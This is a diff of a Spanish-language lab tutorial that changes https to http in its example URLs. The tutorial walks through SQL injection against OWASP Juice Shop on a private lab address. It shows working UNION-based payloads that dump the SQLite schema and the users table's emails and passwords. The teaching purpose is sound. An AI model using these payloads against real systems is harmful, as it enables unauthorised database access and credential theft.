@@ -59,7 +59,7 @@ Si prefieres, puedes hacer que ZAP use el propio navegador para mostrar los dato
 
 Vamos a jugar con el parámetro ***q***, solicitando información sobre el zumo de limón. Para ello, en la barra de navegación, escribimos lo siguiente.
 ```
-https://192.168.20.80:3000/rest/products/search?q=lemon
+http://192.168.20.80:3000/rest/products/search?q=lemon
 ```
 
 Podemos observar cómo se devuelven los datos para el producto con ***id=5***, que es el ***zumo de limón***.
@@ -68,7 +68,7 @@ Podemos observar cómo se devuelven los datos para el producto con ***id=5***, q
 
 Aunque ZAP tiene herramientas automatizadas para probar si la inyección de SQL es posible, por ahora lo haremos manualmente. Si el interprete no filtra correctamente la entrada de usuario, es posible provocar errores. Vamos a usar caracteres que tienen significado en SQL, por ejemplo, ***'*** y ***;***. Escribimos en la URL del navegador lo siguiente.
 ```
-https://192.168.20.80:3000/rest/products/search?q=';
+http://192.168.20.80:3000/rest/products/search?q=';
 ```
 
 Y obtendremos un bonito error del intérprete de SQL, demostrando que la inyección es posible.
@@ -77,7 +77,7 @@ Y obtendremos un bonito error del intérprete de SQL, demostrando que la inyecci
 
 Estamos a ciegas (blind). Sabemos que la aplicación es vulnerable, pero debemos construir consultas SQL cada vez más precisas, que lleven al objetivo buscado (Pedir un producto que no está en el stock). Realizamos otra prueba, escribiendo en en navegador la siguiente URL.
 ```
-https://192.168.20.80:3000/rest/products/search?q='--
+http://192.168.20.80:3000/rest/products/search?q='--
 ```
 
 En este caso obtenemos un error ligeramente diferente: ***incomplete input***, que ocurre porque falta algún paréntesis en la consulta.
@@ -86,7 +86,7 @@ En este caso obtenemos un error ligeramente diferente: ***incomplete input***, q
 
 Para arreglar el error, añadimos ***'))--***, así que en la barra de direcciones escribimos.
 ```
-https://192.168.20.80:3000/rest/products/search?q='))--
+http://192.168.20.80:3000/rest/products/search?q='))--
 ```
 
 Si observas, la aplicación devuelve otra vez la lista de productos, pero en este caso también muestra el producto descatalogado ***Christmas Super-Surprise-Box (2014 Edition)*** con ***id=10***.
@@ -146,7 +146,7 @@ Los errores que aparecieron el el ejercicio anterior mostraron que la base de da
 
 Usaremos ***ZAP***, así que si no estuviera abierto, lo abrimos y conectamos a la siguiente URL.
 ```
-https://192.168.20.80:3000/rest/products/search?q=')) UNION SELECT * FROM x--
+http://192.168.20.80:3000/rest/products/search?q=')) UNION SELECT * FROM x--
 ```
 
 Esta instruccion usa el operador ***UNION*** con una tabla que se llama ***x***, que es muy probable que no exista y es ése precisamente el resultado que se obtiene, tal y como se aprecia en la imagen.
@@ -155,7 +155,7 @@ Esta instruccion usa el operador ***UNION*** con una tabla que se llama ***x***,
 
 Mediante esta técnica podemos determinar si existe o no una tabla en concreto, y en el caso de existir, al usar ***UNION***, devolverá todos sus registros. Así que procedemos a cambiar ***x*** por ***sqlite_schema***. En la URL escribimos lo siguiente,
 ```
-https://192.168.20.80:3000/rest/products/search?q=')) UNION SELECT * FROM sqlite_schema--
+http://192.168.20.80:3000/rest/products/search?q=')) UNION SELECT * FROM sqlite_schema--
 ```
 
 Como resultado tenemos un mensaje que nos dice que el operador ***UNION*** no tiene el mismo número de columnas, lo que demuestra que la tabla ***sqlite_schema*** se puede consultar.
@@ -165,20 +165,20 @@ Como resultado tenemos un mensaje que nos dice que el operador ***UNION*** no ti
 La técnica en el ataque ***UNION*** es encontrar el número de columnas correcto, así que hay que ir probando. Debemos poner en la URL lo siguiente, hasta que desaparezca el error.
 
 ```
-https://192.168.20.80:3000/rest/products/search?q=')) UNION SELECT '1' FROM sqlite_schema--
+http://192.168.20.80:3000/rest/products/search?q=')) UNION SELECT '1' FROM sqlite_schema--
 ```
 
 ```
-https://192.168.20.80:3000/rest/products/search?q=')) UNION SELECT '1', '2' FROM sqlite_schema--
+http://192.168.20.80:3000/rest/products/search?q=')) UNION SELECT '1', '2' FROM sqlite_schema--
 ```
 
 ```
-https://192.168.20.80:3000/rest/products/search?q=')) UNION SELECT '1', '2', '3' FROM sqlite_schema--
+http://192.168.20.80:3000/rest/products/search?q=')) UNION SELECT '1', '2', '3' FROM sqlite_schema--
 ```
 
 Seguimos probando hasta este.
 ```
-https://192.168.20.80:3000/rest/products/search?q=')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_schema--
+http://192.168.20.80:3000/rest/products/search?q=')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_schema--
 ```
 
 Nos fijamos en el último elemento que devuelve el recordset, en este ejemplo el ***44***.
@@ -187,7 +187,7 @@ Nos fijamos en el último elemento que devuelve el recordset, en este ejemplo el
 
 Modificamos ligeramente el ataque para que no aparezcan los productos. Para ello escribimos un producto que no exista seguro, como ***hfhdskfhskdjfhsjkfh***. En la barra de direcciones escribimos.
 ```
-https://192.168.20.80:3000/rest/products/search?q=hfhdskfhskdjfhsjkfh')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_schema--
+http://192.168.20.80:3000/rest/products/search?q=hfhdskfhskdjfhsjkfh')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_schema--
 ```
 
 Como resultado obtenemos lo siguiente.
@@ -197,7 +197,7 @@ Como resultado obtenemos lo siguiente.
 Por último solo hay que reemplazar uno de los valores fijos ('1', '2', ...) con el nombre de la columna correcta, que es ***sql***. En la barra de direcciones escribimos.
 (Nota: hemos sustituido ***'1'*** por ***sql***.)
 ```
-https://192.168.20.80:3000/rest/products/search?q=hfhdskfhskdjfhsjkfh')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_schema--
+http://192.168.20.80:3000/rest/products/search?q=hfhdskfhskdjfhsjkfh')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_schema--
 ```
 
 Como resultado tenemos exfiltrado todo el esquema de la base de datos, ya que la primera columna se sustituye por las instrucciones SQL que se usaron para crear las tablas de dicha base de datos.
@@ -227,17 +227,17 @@ Vamos a utilizar la técnica ***UNION*** para obtener todos los registros de dic
 
 Activamos ***OWASP ZAP*** y probamos lo siguiente.
 ```
-https://192.168.20.80:3000/rest/products/search?q=')) UNION SELECT '1' FROM users--
+http://192.168.20.80:3000/rest/products/search?q=')) UNION SELECT '1' FROM users--
 ```
 
 Obtenemos un error, así que volvemos a probar con diferentes números de columnas hasta acertar. La instrucción de inyección correcta es.
 ```
-https://192.168.20.80:3000/rest/products/search?q=ewrwerwewerwerwer')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM users--
+http://192.168.20.80:3000/rest/products/search?q=ewrwerwewerwerwer')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM users--
 ```
 
 Como ya sabemos los campos que forman la tabla ***Users***, modificamos la consulta anterior de la siguiente forma.
 ```
-https://192.168.20.80:3000/rest/products/search?q=ewrwerwewerwerwer')) UNION SELECT id, username, email, password, '5', '6', '7', '8', '9' FROM users--
+http://192.168.20.80:3000/rest/products/search?q=ewrwerwewerwerwer')) UNION SELECT id, username, email, password, '5', '6', '7', '8', '9' FROM users--
 ```
 
 En la siguiente imagen podemos ver los siguiente.
